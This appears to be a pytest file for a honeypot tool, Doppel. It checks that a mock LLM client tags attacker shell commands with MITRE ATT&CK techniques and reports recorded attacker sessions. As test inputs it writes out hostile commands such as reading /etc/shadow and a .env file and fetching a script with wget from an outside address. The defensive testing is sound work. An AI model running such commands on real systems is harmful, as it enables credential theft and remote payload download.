"""Mock mode: rulebook ATT&CK tags and assistant answers built from recorded sessions."""
import json

from doppel.ai.llm_client import LLMClient
from doppel.ai.prompts.threat_prompts import MITRE_ANALYSIS_SYSTEM_PROMPT, build_command_analysis_prompt


def tag(command):
    client = LLMClient(mock_mode=True)
    messages = [{"role": "system", "content": MITRE_ANALYSIS_SYSTEM_PROMPT},
                {"role": "user", "content": build_command_analysis_prompt(command, {})}]
    return json.loads(client._mock_response(messages))


def test_mock_tags_follow_the_command():
    assert tag("cat /var/www/html/.env")["technique_id"] == "T1552.001"
    assert tag("cat /etc/shadow")["technique_id"] == "T1003.008"
    assert tag("crontab -e")["tactics"] == ["Persistence"]
    wget = tag("wget http://203.0.113.5/x.sh")
    assert wget["technique_id"] == "T1105" and wget["iocs"] == ["http://203.0.113.5/x.sh"]
    assert tag("whoami")["threat_score"] < tag("sudo su")["threat_score"]
    # Everyday shell use stays in Discovery, so it never moves the kill chain past reconnaissance
    assert tag("pwd")["tactics"] == ["Discovery"] and tag("pwd")["threat_score"] <= 15


def test_mock_assistant_reports_recorded_sessions():
    sessions = [{"session_id": "abcd1234", "remote_ip": "198.51.100.7", "city": "unknown", "country": "unknown",
                 "username": "admin", "start_time": "2026-11-08T10:00:00+00:00", "max_threat_score": 85,
                 "command_count": 6, "last_command": "wget http://x/y", "credential_risk": "high",
                 "recent_commands": ["id", "wget http://x/y"]}]
    system = ("You are the Doppel AI Security Intelligence Assistant and Live Benchmark Tool.\n\n"
              "CURRENT DOPPEL SYSTEM STATE:\n- Honeypot Status: RUNNING\n- SSH Port: 2222\n\n"
              f"RECENT ATTACKER SESSIONS (Last 1):\n{json.dumps(sessions, indent=2)}\n\nINSTRUCTIONS:\n- be brief")
    client = LLMClient(mock_mode=True)
    ask = lambda q: client._mock_response([{"role": "system", "content": system}, {"role": "user", "content": q}])
    last = ask("What was the last attack like?")
    assert "198.51.100.7" in last and "85 / 100" in last and "`wget http://x/y`" in last
    assert "outbound" in ask("Any defensive suggestions?")
    assert "Honeypot Status: RUNNING" in ask("What is the system status?")
